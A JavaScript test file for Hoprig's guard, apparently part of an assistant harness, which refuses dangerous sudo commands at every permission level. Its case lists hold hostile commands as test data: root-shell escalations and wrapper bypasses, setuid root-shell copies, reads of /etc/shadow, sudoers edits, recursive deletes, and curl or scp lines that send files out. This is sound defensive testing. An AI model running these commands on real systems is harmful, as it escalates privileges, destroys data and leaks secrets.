// The administrator commands refused with NO card at EVERY level, "Full" too. They
// would change who may be administrator, or switch a safety rule off, so no level ever lets one of them run. The list
// is data with a reason per entry (src/assistant/adminrefused.mjs ADMIN_REFUSED); this is the one test over the whole
// list. What the reader cannot break down is refused too (fail closed), and a plain `sudo <program>` that is none of
// these returns null here (what then happens to it is decided by her level, in other code).
import assert from 'node:assert/strict';
import { test } from 'node:test';
import { ADMIN_REFUSED, adminRefusal, sudoArgv } from '../../src/assistant/adminrefused.mjs';

const HOPRIG = ['/home/example/.config/hoprig', '/home/example/.local/state/hoprig', '/opt/hoprig'];
// The rows below name POSIX places, so they are read as on Linux everywhere (on Windows `/a/` is the drive A:, and a
// folder written `/home/…` has no drive); test/assistant/adminrefused-windows.test.mjs gives Windows' own rows.
const refuse = (line) => adminRefusal(line, { hoprigDirs: HOPRIG, platform: 'linux' });

// A line that must be refused, for each entry of the list, so every entry is exercised and named.
const CASES = {
  'non-sudo-escalator': ['su', 'su - alex', 'doas id', 'pkexec id', 'runas /user:admin cmd', 'run0 bash'],
  sudoedit: ['sudoedit /etc/hosts', 'sudo -e /etc/hosts'],
  'login-or-shell-flag': ['sudo -i', 'sudo -s', 'sudo --login', 'sudo --shell'],
  'option-not-read': ['sudo -u root whoami', 'sudo --user=postgres psql', 'sudo -g wheel id', 'sudo -si'],
  'no-program': ['sudo', 'sudo -n'],
  'shell-as-admin': ['sudo bash', 'sudo sh -c "echo hi"', 'sudo zsh', 'sudo /bin/dash', 'sudo env bash', 'sudo env FOO=bar bash', 'sudo FOO=bar bash', 'sudo PATH=/x bash', 'sudo LD_PRELOAD=/x.so bash', 'sudo -E FOO=bar bash'],
  'editor-as-admin': ['sudo vim /etc/hosts', 'sudo nano /tmp/x', 'sudo visudo', 'sudo FOO=bar visudo'],
  'account-or-auth': ['sudo passwd alex', 'sudo usermod -aG wheel alex', 'sudo gpasswd -a alex sudo', 'sudo pam-auth-update'],
  'escalator-as-admin': ['sudo su', 'sudo su -', 'sudo su -c id', 'sudo sudo id', 'sudo doas id', 'sudo pkexec id', 'sudo runas /user:admin cmd', 'sudo sudoedit /etc/hosts', 'sudo env su', 'sudo env X=y su', 'sudo FOO=bar su'],
  // The wall's one list of programs that run their own words (a list of its own here missed chrt, flock, busybox…).
  'passer-as-admin': ['sudo nice bash', 'sudo timeout 5 bash', 'sudo nohup bash', 'sudo ionice -c3 bash', 'sudo env -i bash', 'sudo chrt 1 bash', 'sudo taskset 1 sh', 'sudo flock /tmp/l su', 'sudo numactl -N 0 bash', 'sudo firejail bash', 'sudo busybox sh', 'sudo watch bash', 'sudo script -c bash /dev/null', 'sudo xargs bash', 'sudo strace -f bash', 'sudo find /var -name x -exec bash ;'],
  'privilege-tool-as-admin': ['sudo setpriv --reuid 0 bash', 'sudo capsh --', 'sudo unshare -r bash', 'sudo nsenter -t 1 -m bash', 'sudo chroot / bash', 'sudo env FOO=bar setpriv --reuid 0 bash', 'sudo FOO=bar setpriv --reuid 0 bash'],
  setuid: ['sudo chmod u+s /usr/bin/foo', 'sudo chmod 4755 /usr/bin/foo', 'sudo chmod g+s /tmp/dir', 'sudo install -m 4755 /bin/bash /tmp/rootsh', 'sudo install -m4755 /bin/dash /tmp/rootsh', 'sudo install --mode=6755 a b'],
  'protected-path': ['sudo tee /etc/sudoers.d/mine', 'sudo cp x /etc/pam.d/common-auth', 'sudo cat /etc/shadow', 'echo x | sudo tee /etc/sudoers'],
  'hoprig-own': ['sudo rm -rf /opt/hoprig', 'sudo cp evil /home/example/.config/hoprig/config.json', 'sudo tee /home/example/.local/state/hoprig/runs/x', 'sudo chown -R nobody /', 'sudo mv /home/example /tmp/x', 'sudo rm -rf /opt', 'sudo chmod -R 000 /home/example//.config', 'sudo rm -rf /home/*'],
  // Asked only of her own tool, which runs the words as written with no shell between (`argv: true`).
  'word-not-read': ['sudo rm -rf $PREFIX/etc', 'sudo chown -R nobody ${TARGET}', 'sudo cp x "$DEST"/y'],
  'wrapper-before-sudo': ['chroot /mnt sudo apt-get install -y x', 'nice -n 5 sudo apt-get install -y x', 'timeout 60 sudo systemctl restart nginx', 'nohup sudo apt-get update', 'time sudo apt-get update'],
  'push-or-merge-as-admin': ['sudo git push origin main', 'sudo git merge feature', 'sudo env GIT_SSH=x git push'],
  'sends-out-as-admin': ['sudo scp x host:', 'sudo rsync -a /a/ host:/b/', 'sudo curl -d @x http://h', 'sudo wget --post-file x http://h'],
};
const ARGV_ONLY = new Set(['word-not-read', 'wrapper-before-sudo', 'push-or-merge-as-admin', 'sends-out-as-admin']);

test('every entry of ADMIN_REFUSED is a data row with an id and a reason', () => {
  for (const e of ADMIN_REFUSED) {
    assert.ok(typeof e.id === 'string' && e.id, 'an id');
    assert.ok(typeof e.why === 'string' && e.why.length > 10, `a reason for ${e.id}`);
    assert.equal(typeof e.match, 'function', `a matcher for ${e.id}`);
  }
  const ids = ADMIN_REFUSED.map((e) => e.id);
  assert.equal(new Set(ids).size, ids.length, 'the ids are unique');
});

test('the whole list: each named form is refused, with its own reason', () => {
  for (const [id, lines] of Object.entries(CASES)) {
    assert.ok(ADMIN_REFUSED.some((e) => e.id === id), `${id} is a real entry of the list`);
    for (const line of lines) {
      const r = ARGV_ONLY.has(id) ? adminRefusal(line, { hoprigDirs: HOPRIG, argv: true }) : refuse(line);
      // What is asked only of her own tool is not refused for a session, where a shell runs the line as written.
      if (ARGV_ONLY.has(id)) assert.equal(refuse(line), null, `in a session, not refused by this entry: ${line}`);
      assert.ok(r, `refused: ${line}`);
      assert.equal(r.id, id, `${line} → ${id} (got ${r && r.id})`);
      assert.ok(r.why && r.why.length > 10, `a reason for ${line}`);
    }
  }
});

test('every entry of the list has a case that reaches it (and only it)', () => {
  for (const e of ADMIN_REFUSED) assert.ok(CASES[e.id], `a case list for ${e.id}`);
});

test('a line the reader cannot read with certainty is refused (fail closed)', () => {
  for (const line of ['sudo $(something) true', 'sudo `id` true', 'sudo "unclosed', 'sudo bash <<EOF\nid\nEOF']) {
    const r = refuse(line);
    assert.ok(r, `refused: ${line}`);
    assert.equal(r.id, 'unreadable', `${line} → unreadable (got ${r && r.id})`);
  }
});

test('a wrapper or a privilege tool as the sudo program is refused: a root shell cannot slip through a passer or setpriv', () => {
  // `sudo bash` / `sudo su` are refused, so the same root shell must not come back wrapped: `sudo env bash`,
  // `sudo nice bash`, `sudo setpriv --reuid 0 bash` each hand a root shell while hiding which program runs. `env` is
  // read through to the real program (so `sudo env bash` is the shell, `sudo env su` the escalator); every other
  // passer, and env with an option, is refused as a wrapper; a privilege/namespace tool is refused as the program.
  for (const line of ['sudo env bash', 'sudo env su', 'sudo env FOO=bar bash', 'sudo nice bash', 'sudo timeout 5 bash', 'sudo nohup bash', 'sudo env -i bash', 'sudo setpriv --reuid 0 bash', 'sudo unshare -r bash', 'sudo chroot / bash', 'sudo capsh --', 'sudo nsenter -t 1 -m bash', 'sudo env FOO=bar setpriv --reuid 0 bash']) {
    const r = refuse(line);
    assert.ok(r, `refused: ${line}`);
  }
  // The argv a runnable command would run is refused too, so no card or Full run is built from a wrapped form.
  for (const line of ['sudo env bash', 'sudo setpriv --reuid 0 bash', 'sudo nice bash']) {
    assert.ok(sudoArgv(line, { hoprigDirs: [] }).refuse, `sudoArgv refuses: ${line}`);
  }
});

test("sudo's own VAR=value grammar is read through too: a root shell cannot slip past it", () => {
  // sudo accepts `VAR=value` of its own between its options and the program (`sudo FOO=bar bash`), with no `env`
  // wrapper. Without stepping those assignments the reader takes `FOO=bar` for the program and a root shell, an
  // escalator or a privilege tool runs past the every-level refusals. Each of these must be refused.
  for (const line of ['sudo FOO=bar bash', 'sudo PATH=/x bash', 'sudo LD_PRELOAD=/x.so bash', 'sudo FOO=bar su', 'sudo FOO=bar setpriv --reuid 0 bash', 'sudo FOO=bar visudo', 'sudo -E FOO=bar bash']) {
    const r = refuse(line);
    assert.ok(r, `refused: ${line}`);
    assert.ok(sudoArgv(line, { hoprigDirs: [] }).refuse, `sudoArgv refuses: ${line}`);
  }
  // An allowable program carrying a native assignment is read through to the program and runs WITHOUT the
  // assignment (the argv is built from the program alone — a dropped env variable can only lose capability).
  assert.equal(refuse('sudo FOO=bar apt-get install cowsay'), null, 'native assignment + apt-get is not a refused form');
  assert.deepEqual(sudoArgv('sudo FOO=bar apt-get install cowsay', { hoprigDirs: [] }).argv, ['sudo', 'apt-get', 'install', 'cowsay']);
});

test('env with assignments is read through to the real program: the non-interactive apt form still runs', () => {
  // The one wrapped form Hoprig itself writes is `sudo env DEBIAN_FRONTEND=noninteractive apt-get …` (so apt does not
  // wait for an answer nobody sees). It must stay a plain program a card or Full may run — refusing it would stop a
  // session installing a package non-interactively — and the argv that runs keeps the env assignment.
  const line = 'sudo env DEBIAN_FRONTEND=noninteractive apt-get install -y build-essential';
  assert.equal(refuse(line), null, 'env + assignment + apt-get is not a refused form');
  assert.deepEqual(sudoArgv(line, { hoprigDirs: [] }).argv, ['sudo', 'env', 'DEBIAN_FRONTEND=noninteractive', 'apt-get', 'install', '-y', 'build-essential']);
});

test('a plain sudo <program> that is none of these returns null (a candidate for the card, not refused here)', () => {
  for (const line of ['sudo apt-get install cowsay', 'sudo systemctl restart nginx', 'sudo -n true', 'sudo -k apt update', 'sudo chmod 0644 /tmp/x', 'sudo mkdir /opt/other', 'sudo env DEBIAN_FRONTEND=noninteractive apt-get update']) {
    assert.equal(refuse(line), null, `allowable: ${line}`);
  }
  // A program that only reads is not refused for naming a folder that holds Hoprig's; in a session a `$` word is
  // the shell's to fill in, so this list does not judge it there.
  for (const line of ['sudo ls /home/example', 'sudo du -sh /', 'sudo ls /opt', 'sudo chown -R nobody $SOMEWHERE']) {
    assert.equal(refuse(line), null, `allowable: ${line}`);
  }
});

test('a non-administrator line returns null (this list judges only administrator commands)', () => {
  for (const line of ['ls -la', 'git status', 'npm test', 'echo sudo']) {
    assert.equal(refuse(line), null, `not admin: ${line}`);
  }
});

test('Hoprig folders are a parameter: with none given, a Hoprig path is not refused as its own (but a protected system path still is)', () => {
  assert.equal(adminRefusal('sudo rm -rf /opt/hoprig', {}), null, 'no hoprigDirs → not refused as Hoprig-own');
  const r = adminRefusal('sudo tee /etc/sudoers', {});
  assert.ok(r && r.id === 'protected-path', 'a system protected path is refused with no hoprigDirs');
});

test('a Hoprig folder named by ~ or a relative path is refused as its absolute form is', () => {
  const ctx = { hoprigDirs: ['/home/alex/.local/state/hoprig'], home: '/home/alex', cwd: '/home/alex/ws/shop' };
  for (const line of ['sudo rm ~/.local/state/hoprig/hook-settings/r.json.tia', 'sudo rm ../../.local/state/hoprig/x', 'sudo rm /home/alex/.local/state/hoprig/x']) {
    assert.equal((adminRefusal(line, ctx) || {}).id, 'hoprig-own', line);
  }
  assert.equal((adminRefusal('sudo cat ../../../../etc/sudoers', ctx) || {}).id, 'protected-path');
  assert.equal(adminRefusal('sudo rm ~/ws/shop/build.log', ctx), null, 'a file of his own under home is not Hoprig\'s');
  assert.equal(adminRefusal('sudo rm ./build.log', ctx), null);
});
